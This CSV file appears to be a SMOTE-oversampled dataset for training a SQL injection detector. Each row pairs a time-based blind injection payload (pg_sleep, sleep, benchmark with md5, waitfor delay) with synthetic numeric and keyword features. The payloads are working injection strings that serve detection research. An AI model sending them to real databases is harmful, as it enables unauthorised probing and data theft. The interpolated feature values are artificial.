id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000183,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,nearest_attack_euclidean,R000225,0.22459387588899474,95.55635258570106,28.311270517140215,3.568543391566418,30.415027356186954,10.0,42.03756839046738,13.103756839046738,0.3183995699697971,0.1048639931820212,0.43946134810562076,0.13727508874256095,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.8962431609532622,0.0,6.207513678093476,0.0,1.0,0.0,1.896243160953262,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000184,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,0.7526622527113479,104.26675222602901,27.00268035616464,3.5893373327581144,27.002680356164642,21.0,42.512061602740886,13.752010267123481,0.259940859219129,0.2033680274807857,0.40468271548693413,0.13200839781315116,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.7493299109588398,0.0,7.002680356164641,0.0,0.0,1.0,1.7493299109588398,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000185,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,1.1415399080261577,55.72938674991308,18.576462249971026,3.2904545113061774,24.30584899988411,1.4235377500289728,22.576462249971026,7.423537750028973,0.43550010964771085,0.02579995614091564,0.40515999122818314,0.13353994298319033,3.4235377500289728,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.5764622499710271,0.0,2.7755575615628914e-17,0.0,1.0,0.42353775002897287,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000186,attack,time,"1%""   )    )    waitfor delay '0:0:5' and    (    (   ""%""  =  """,nearest_attack_euclidean,R000222,1.0326102993388064,58.9458520331105,22.118663485458804,3.3140360897324603,14.647465394183522,3.647465394183521,26.70852506219289,13.942396182550564,0.25341370608607316,0.06111385384965074,0.44968546426902684,0.23578697579524924,1.6474653941835213,3.9999999999999996,0.0,0.0,0.0,1.0,0.0,3.647465394183521,2.0,0.0,0.0,1.0,0.8237326970917607,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.17626730290823928,0.0,0.8237326970917607,0.8237326970917607,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.823732697091761
SMOTE_000187,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,0.9619452112574026,92.71582064388437,27.471582064388436,3.8083034396567284,22.65053722535953,28.528417935611564,32.82949238633062,8.707373096582655,0.2434990574821198,0.3107893497118236,0.35222229699921753,0.09348929580683908,0.0,0.23579103219421838,0.0,0.0,0.0,2.0,0.0,4.4715820643884365,0.0,0.0,1.0,2.0,0.0,0.23579103219421838,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.7642089678057816,0.23579103219421843,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000188,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,0.05477407613828995,59.930353996062635,18.023215334645787,3.2488359237282944,27.953569330708426,1.0,23.0,7.976784665354213,0.46642229472302676,0.016687030995303317,0.38380171289197645,0.13308896138969348,3.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.9767846653542128,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.023215334645787067,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.023215334645787
SMOTE_000189,attack,time,1'   )    )     )   and sleep  (  5  )  #,nearest_attack_euclidean,R000221,0.5307419786257258,39.30621640571661,14.0,2.518279584832841,8.338756718856676,2.0,22.306216405716615,6.6612432811433235,0.21671069569424928,0.0514457649005246,0.5627109983455408,0.16913254105968525,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,4.6612432811433235,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.8306216405716617,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8306216405716615
SMOTE_000190,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.24495656473530475,36.79295065795311,16.088105628661456,3.270005777642317,13.0,0.0,13.616739400630202,10.176211257322914,0.3547479268188948,0.0,0.36845324683289915,0.276798826348206,0.0,0.08810562866145688,2.0,0.0,0.0,0.0,0.0,3.0881056286614568,0.0,5.0,0.0,2.0,0.0,0.08810562866145691,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000191,attack,time,"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",nearest_attack_euclidean,R000099,0.37344316823834034,49.87617882953492,22.46904470738373,4.05801173045558,27.0,3.2345223536918652,11.172611768459326,8.46904470738373,0.5436544537211894,0.06459394958653451,0.22229299724356344,0.16945859944871267,2.0,3.2345223536918652,0.0,0.0,0.0,0.0,0.0,1.2345223536918652,0.0,0.0,0.0,2.220446049250313e-16,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000192,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000287,0.04017953204723687,66.30230731857937,26.0,3.626276451672372,20.0,10.0,27.248958968241833,9.053348350337536,0.3019265888332261,0.15096329441661305,0.41060040056632313,0.13650971618383773,1.0,1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,4.053348350337536,0.0,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000193,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000279,1.7524436985253875,61.98837028052856,21.56976718293265,3.342408785491318,17.279068731730604,10.0,26.709301548797953,8.0,0.27781443825794344,0.16183456159010995,0.43088335087985874,0.12946764927208795,0.0,0.5697671829326507,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.4302328170673493,3.0,0.0,0.5697671829326507,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.5697671829326507,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.569767182932651
SMOTE_000194,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   ",nearest_attack_euclidean,R000129,1.673231621910994,62.05468641913378,25.309151322485906,3.861131478566468,21.745535096647874,15.0,19.436383774161968,5.872767548323938,0.34974135652787597,0.24247039129763565,0.3137410376764289,0.09404721449805944,0.0,1.1102230246251565e-16,0.8727675483239377,0.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.8727675483239379,0.0,0.0,0.43638377416196883,0.0,0.0,0.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000195,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000244,1.6545669982068139,80.38120592630428,25.158392098260965,3.271542577619588,19.53959802456524,10.0,38.84160790173904,12.0,0.2432856013298192,0.12445012978341422,0.4829241131466696,0.14934015574009704,1.0,1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,6.460401975434759,0.539598024565241,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,0.539598024565241,0.46040197543475914,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000196,attack,time,1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,nearest_attack_euclidean,R000201,0.5042604800372825,62.34213254544535,22.164466863638662,3.350700785379249,19.328933727277324,10.0,27.013198818168032,6.0,0.31052523714151453,0.16050004695871573,0.4326746877245402,0.09630002817522945,0.16446686363866125,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,3.835533136361339,0.0,0.0,0.0,1.0,0.1644668636386613,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.8355331363613387,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.835533136361339
SMOTE_000197,attack,time,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000213,0.13077585075150958,67.19396462765316,25.935345124115614,3.7143632280567753,15.064654875884385,20.935345124115614,24.12930975176877,7.064654875884385,0.2241714183744544,0.31171434596913317,0.3590285426916442,0.10508569296476827,0.03232743794219228,0.9676725620578078,0.0,0.0,0.0,1.0,0.0,4.032327437942192,0.0,0.0,1.0,1.0,0.03232743794219217,0.9676725620578079,0.0,0.03232743794219217,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000198,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,0.8437285963852441,104.38901672620219,29.778033452404387,3.6024973679464516,30.0,18.0,45.0,11.389016726202192,0.2873928111917522,0.17243568671505133,0.43108921678762835,0.10908228530556813,0.3890167262021923,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,6.0,0.0,1.0,0.0,4.0,0.3890167262021922,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000199,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000249,0.39983062627110405,102.3525720358321,22.258971185667164,2.8476229187557753,29.03588474266865,1.0,55.70514407166418,16.611543221499257,0.2842108293532368,0.009772877745608075,0.5438412159043968,0.16217507699675826,0.0,3.0,0.0,0.0,1.0,1.0,0.0,10.741028814332836,0.8705144071664185,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000200,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,nearest_attack_euclidean,R000225,0.7527360766847971,94.27451854070767,27.176444377876958,3.5490116638266187,30.274518540707682,10.0,41.0,13.0,0.3211163702805478,0.10607556714366441,0.4349098252890241,0.13789823728676373,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,6.0,0.0,1.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,1.2745185407076802,0.7254814592923198,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
